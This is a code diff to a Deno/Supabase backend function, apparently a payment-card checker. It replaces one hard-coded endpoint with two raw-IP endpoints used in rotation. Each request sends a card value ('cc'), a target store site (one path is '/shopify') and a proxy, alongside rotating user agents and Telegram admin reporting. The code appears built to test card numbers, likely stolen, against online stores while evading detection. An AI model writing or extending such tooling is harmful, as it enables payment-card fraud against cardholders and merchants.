@@ -12,7 +12,11 @@ const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
 const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";
 
-const API_BASE_URL = "http://188.137.230.163:5000/shopify";
+const API_ENDPOINTS = [
+  { base: "http://188.137.230.163:5000/shopify", buildUrl: (cc: string, site: string, proxy: string) => `http://188.137.230.163:5000/shopify?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${proxy}` },
+  { base: "http://108.165.12.183:8081/", buildUrl: (cc: string, site: string, proxy: string) => `http://108.165.12.183:8081/?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}` },
+];
+let apiRotationIndex = 0;
 
 const badResponses = [
   "Site not supported",
@@ -143,7 +147,9 @@ const userAgents = [
 const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
 
 const callApiOnce = async (cc: string, site: string, proxy: string): Promise<{ status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string }> => {
-  const apiUrl = `${API_BASE_URL}?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${proxy}`;
+  const endpoint = API_ENDPOINTS[apiRotationIndex % API_ENDPOINTS.length];
+  apiRotationIndex++;
+  const apiUrl = endpoint.buildUrl(cc, site, proxy);
   
   const controller = new AbortController();
   const timeoutId = setTimeout(() => controller.abort(), 55000);
